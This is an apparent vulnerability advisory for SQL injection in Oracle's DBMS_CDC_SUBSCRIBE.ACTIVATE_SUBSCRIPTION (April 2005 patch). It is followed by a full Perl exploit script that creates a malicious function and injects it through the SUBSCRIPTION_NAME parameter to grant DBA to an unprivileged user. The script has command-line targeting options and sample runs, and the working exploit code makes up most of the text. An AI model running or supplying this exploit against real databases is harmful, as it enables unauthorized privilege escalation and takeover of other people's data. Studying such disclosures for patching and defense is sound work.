source: http://www.securityfocus.com/bid/13236/info

Oracle database is prone to an SQL-injection vulnerability because the software fails to properly sanitize user-supplied data. The 'SUBSCRIPTION_NAME' parameter is vulnerable.

Packages that employ this parameter execute with 'SYS' user privileges. Exploiting the SQL-injection vulnerability can allow an attacker to gain 'SYS' privileges.

The attacker can exploit this issue using malformed PL/SQL statements to pass unauthorized SQL statements to the database. A successful exploit could allow the attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.

This issue was originally disclosed in the 'Oracle Critical Patch Update - April 2005' advisory. BID 13139 Oracle Multiple Vulnerabilities describes the issues covered in the Oracle advisory. There is insufficient information at this time to associate this vulnerability with an identifier from the Oracle advisory. 

#!/usr/bin/perl
#
# Remote Oracle DBMS_CDC_SUBSCRIBE.ACTIVATE_SUBSCRIPTION exploit (9i/10g)
#
# Grant or revoke dba permission to unprivileged user
# 
# Tested on "Oracle Database 10g Enterprise Edition Release 10.1.0.3.0"
# 
#   REF:    http://www.securityfocus.com/archive/1/396133
#
#   AUTHOR: Andrea "bunker" Purificato
#           http://rawlab.mindcreations.com
#
#   DATE:   Copyright 2007 - Fri Feb 23 12:44:18 CET 2007
#
# Oracle InstantClient (basic + sdk) required for DBD::Oracle
#
#
# bunker@fin:~$ perl dbms_cdc_subscribe.pl -h localhost -s test -u bunker -p **** -r
#  [-] Wait...
#  [-] Revoking DBA from BUNKER...
#  DBD::Oracle::db do failed: ORA-01031: insufficient privileges (DBD ERROR: OCIStmtExecute) [for Statement "REVOKE DBA FROM BUNKER"] at dbms_cdc_subscribe.pl line 91.
#  [-] Done!
# 
# bunker@fin:~$ perl dbms_cdc_subscribe.pl -h localhost -s test -u bunker -p **** -g
#  [-] Wait...
#  [-] Creating evil function...
#  [-] Go ...(don't worry about errors)!
#  DBD::Oracle::st execute failed: ORA-31425: subscription does not exist
#  ORA-06512: at "SYS.DBMS_CDC_SUBSCRIBE", line 37
#  ORA-06512: at line 3 (DBD ERROR: OCIStmtExecute) [for Statement "
#  BEGIN
#   SYS.DBMS_CDC_SUBSCRIBE.ACTIVATE_SUBSCRIPTION('''||BUNKER.own||''');
#  END;
#  "] at dbms_cdc_subscribe.pl line 114.
#  [-] YOU GOT THE POWAH!!
#
# bunker@fin:~$ perl dbms_cdc_subscribe.pl -h localhost -s test -u bunker -p **** -r
#  [-] Wait...
#  [-] Revoking DBA from BUNKER...
#  [-] Done!
#  

use warnings;
use strict;
use DBI;
use Getopt::Std;
use vars qw/ %opt /;

sub usage {
    print <<"USAGE";
    
Syntax: $0 -h <host> -s <sid> -u <user> -p <passwd> -g|-r [-P <port>]

Options:
     -h     <host>     target server address
     -s     <sid>      target sid name
     -u     <user>     user
     -p     <passwd>   password 

     -g|-r             (g)rant dba to user | (r)evoke dba from user
    [-P     <port>     Oracle port]

USAGE
    exit 0
}

my $opt_string = 'h:s:u:p:grP:';
getopts($opt_string, \%opt) or &usage;
&usage if ( !$opt{h} or !$opt{s} or !$opt{u} or !$opt{p} );
&usage if ( !$opt{g} and !$opt{r} );
my $user = uc $opt{u};

my $dbh = undef;
if ($opt{P}) {
    $dbh = DBI->connect("dbi:Oracle:host=$opt{h};sid=$opt{s};port=$opt{P}", $opt{u}, $opt{p}) or die;
} else {
    $dbh = DBI->connect("dbi:Oracle:host=$opt{h};sid=$opt{s}", $opt{u}, $opt{p}) or die;
}

my $sqlcmd = "GRANT DBA TO $user";
print "[-] Wait...\n";

if ($opt{r}) {
    print "[-] Revoking DBA from $user...\n";
    $sqlcmd = "REVOKE DBA FROM $user";
    $dbh->do( $sqlcmd );
    print "[-] Done!\n";
    $dbh->disconnect;
    exit;
}

print "[-] Creating evil function...\n";
$dbh->do( qq{
CREATE OR REPLACE FUNCTION OWN RETURN NUMBER 
 AUTHID CURRENT_USER AS 
 PRAGMA AUTONOMOUS_TRANSACTION; 
BEGIN
 EXECUTE IMMEDIATE '$sqlcmd'; COMMIT; 
 RETURN(0);
END;
} );
 
print "[-] Go ...(don't worry about errors)!\n";
my $sth = $dbh->prepare(qq{
BEGIN
 SYS.DBMS_CDC_SUBSCRIBE.ACTIVATE_SUBSCRIPTION('''||$user.own||''');
END;
});
$sth->execute;
$sth->finish;
print "[-] YOU GOT THE POWAH!!\n";
$dbh->disconnect;
exit;